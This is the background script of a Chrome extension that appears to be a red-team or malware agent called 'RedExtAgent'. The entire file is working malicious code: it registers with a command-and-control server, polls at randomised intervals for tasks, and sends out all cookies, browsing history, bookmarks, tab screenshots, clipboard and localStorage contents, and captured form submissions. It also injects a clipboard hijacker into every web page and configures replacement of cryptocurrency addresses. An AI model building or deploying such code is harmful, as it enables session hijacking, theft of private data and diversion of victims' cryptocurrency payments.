// background.js

const C2_SERVER = 'http://127.0.0.1:5000'; // Update if using remote/HTTPS
const MIN_POLL_SECONDS = 5;
const MAX_POLL_SECONDS = 30;

let agent_id = null;

// --- Clipboard Hijacking Logic ---

// Injects the clipboard hijacker script into a specific tab.
function injectClipboardScript(tabId) {
  chrome.scripting.executeScript({
    target: { tabId: tabId },
    files: ['clipboard_hijacker.js'],
  }).catch(err => {
    // Suppress errors for URLs we can't access
    if (!err.message.includes('Cannot access a chrome:// URL') && 
        !err.message.includes('Cannot access contents of the page') &&
        !err.message.includes('The tab was closed')) {
      // Non-critical injection failures can be logged quietly if needed
    }
  });
}

// Inject the script whenever a tab is updated to a compatible URL.
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url && (tab.url.startsWith('http://') || tab.url.startsWith('https://'))) {
    injectClipboardScript(tabId);
  }
});

// Generate random interval
function getRandomInterval() {
  return Math.floor(
    Math.random() * (MAX_POLL_SECONDS - MIN_POLL_SECONDS + 1) + MIN_POLL_SECONDS
  ) * 1000;
}

// Fetch with retries
async function fetchWithRetry(url, options, retries = 3, backoff = 3000) {
  for (let i = 0; i < retries; i++) {
    try {
      const response = await fetch(url, options);
      if (!response.ok) throw new Error(`Status: ${response.status}`);
      return response;
    } catch (error) {
      if (i < retries - 1) {
        await new Promise((res) => setTimeout(res, backoff));
      } else {
        throw error;
      }
    }
  }
}

// Exfil data
async function exfilData(action, payload) {
  try {
    const response = await fetchWithRetry(`${C2_SERVER}/api/exfil`, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        agent_id,
        action,
        payload
      })
    });
    await response.json();
  } catch (err) {
    // Error is handled by fetchWithRetry logging
  }
}

// Capture screenshot
async function captureScreenshot(quality) {
  try {
    const [activeTab] = await chrome.tabs.query({active: true, currentWindow: true});
    if (!activeTab) {
      return;
    }
    const tabUrl = activeTab.url;

    const restrictedSchemes = ['chrome://', 'devtools://', 'chrome-extension://', 'about:'];
    const isRestricted = restrictedSchemes.some((scheme) => tabUrl.startsWith(scheme));
    if (isRestricted) {
      console.warn(`[Screenshot] Restricted URL: ${tabUrl}`);
      return;
    }

    const dataUrl = await new Promise((resolve, reject) => {
      chrome.tabs.captureVisibleTab(null, {format: 'png'}, (res) => {
        if (chrome.runtime.lastError) {
          reject(new Error(chrome.runtime.lastError.message));
        } else {
          resolve(res);
        }
      });
    });

    const base64Data = dataUrl.split(',')[1];
    
    exfilData('take_screenshot', {
      screenshot: base64Data,
      location: tabUrl
    });
  } catch (err) {
    // Errors are logged by the promise rejection handler
  }
}

// Retrieve cookies
async function getCookiesForDomain(domain = null) {
  const options = domain ? {domain} : {};
  
  chrome.cookies.getAll(options, (cookies) => {
    const cookiesByDomain = {};
    cookies.forEach(cookie => {
      if (!cookiesByDomain[cookie.domain]) {
        cookiesByDomain[cookie.domain] = [];
      }
      cookiesByDomain[cookie.domain].push(cookie);
    });
    
    exfilData('cookies', {
      domain: domain || 'all',
      cookies: cookiesByDomain
    });
  });
}

// Get browsing history
async function getBrowsingHistory(days = 7) {
  try {
    const microsecondsPerDay = 1000 * 60 * 60 * 24;
    const startTime = new Date().getTime() - (microsecondsPerDay * days);
    
    const historyItems = await chrome.history.search({
      text: '',
      startTime: startTime,
      maxResults: 5000
    });

    const processedHistory = historyItems.map(item => ({
      url: item.url,
      title: item.title,
      visitCount: item.visitCount,
      lastVisit: new Date(item.lastVisitTime).toISOString(),
      typedCount: item.typedCount
    }));

    exfilData('history', {
      days: days,
      entries: processedHistory,
      totalItems: processedHistory.length
    });
  } catch (error) {
    exfilData('HISTORY', {
      error: error.message,
      days: days
    });
  }
}

// Get bookmarks
async function getBookmarks() {
  try {
    const bookmarkTree = await chrome.bookmarks.getTree();
    exfilData('BOOKMARKS', {
      bookmarks: bookmarkTree[0],
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    exfilData('BOOKMARKS', {
      error: error.message
    });
  }
}

// Handle commands from C2
async function handleCommand(command) {
  switch (command.type) {
    case 'domsnapshot':
      broadcastMessage({command: 'domSnapshot'});
      break;
    case 'clipboardcapture':
    case 'capture_clipboard':
      broadcastMessage({command: 'clipboardCapture'});
      break;
    case 'localstoragedump':
      broadcastMessage({command: 'localStorageDump'});
      break;
    case 'getcookies':
      await getCookiesForDomain(command.payload?.domain || null);
      break;
    case 'screenshot':
    case 'take_screenshot':
      await captureScreenshot(command.payload?.quality || 50);
      break;
    case 'history':
      await getBrowsingHistory(command.payload?.days || 7);
      break;
    case 'bookmarks':
      await getBookmarks();
      break;
    case 'enumeration':
      broadcastMessage({command: 'enumeration'});
      break;
    case 'replace_crypto':
      let configPayload = command.payload;
      
      // CRITICAL: Ensure the payload is an object. C2 might send it as a JSON string.
      if (typeof configPayload === 'string') {
        try {
          configPayload = JSON.parse(configPayload);
        } catch (e) {
          console.error('[Crypto] Failed to parse config string. Aborting.', e);
          return; // Do not proceed with invalid config
        }
      }

      chrome.storage.local.set({crypto_replace_config: configPayload}, () => {
        broadcastMessage({command: 'update_crypto_config'});
      });
      break;
    case 'form_submit_capture':
      const formCapturePayload = command.payload || {};
      const formCaptureConfig = {
          enabled: true, // Enable the feature when the command is received
          domains: formCapturePayload.domains || [] // Default to all domains if not specified
      };

      chrome.storage.local.set({form_capture_config: formCaptureConfig}, () => {
          broadcastMessage({command: 'update_form_capture_config'});
      });
      break;
    default:
      console.warn('[Unknown Command]', command.type);
  }
}

// Broadcast a message to content scripts in all tabs
function broadcastMessage(msg) {
  chrome.tabs.query({}, (tabs) => {
    for (const t of tabs) {
      if (t.url && !t.url.startsWith('chrome://') && !t.url.startsWith('chrome-extension://') && !t.url.startsWith('devtools://')) {
        try {
          chrome.tabs.sendMessage(t.id, msg, (response) => {
            if (chrome.runtime.lastError) {
              // Suppress common, non-critical errors
              if (!chrome.runtime.lastError.message.includes('does not exist') && !chrome.runtime.lastError.message.includes('port closed')) {
                // Log more significant errors if necessary
              }
            }
          });
        } catch (err) {
          // Suppress errors if sending to a tab fails
        }
      }
    }
  });
}

// Beacon to fetch tasks
async function beaconToC2() {
  try {
    const res = await fetchWithRetry(`${C2_SERVER}/api/commands?agent_id=${agent_id}`, {
      method: 'GET'
    });
    const commands = await res.json();
    if (commands.length > 0) {
      for (const cmd of commands) {
        await handleCommand(cmd);
      }
    }
  } catch (err) {
    // Error is handled by fetchWithRetry
  }
}

// Schedule next beacon
function scheduleNextBeacon() {
  const interval = getRandomInterval();
  setTimeout(async () => {
    await beaconToC2();
    scheduleNextBeacon();
  }, interval);
}

// Register agent
async function registerAgent() {
  try {
    const response = await fetchWithRetry(`${C2_SERVER}/api/register`, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({agent_name: 'RedExtAgent'})
    });
    const data = await response.json();
    agent_id = data.agent_id;

    chrome.storage.local.set({agent_id}, () => {
      scheduleNextBeacon();
    });
  } catch (err) {
    // Error is handled by fetchWithRetry
  }
}

// --- Extension Lifecycle ---

// On extension install or update
chrome.runtime.onInstalled.addListener(() => {
  registerAgent();
});

// On browser startup
chrome.runtime.onStartup.addListener(() => {
  chrome.storage.local.get('agent_id', (res) => {
    if (res.agent_id) {
      agent_id = res.agent_id;
      scheduleNextBeacon();
    }
  });
});

// Listen for exfil messages from content script
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'exfil') {
    exfilData(message.data.action, {
      url: sender.url,
      location: message.data.location,
      ...message.data
    });
    sendResponse({status: 'ok'});
  }
  return true;
});
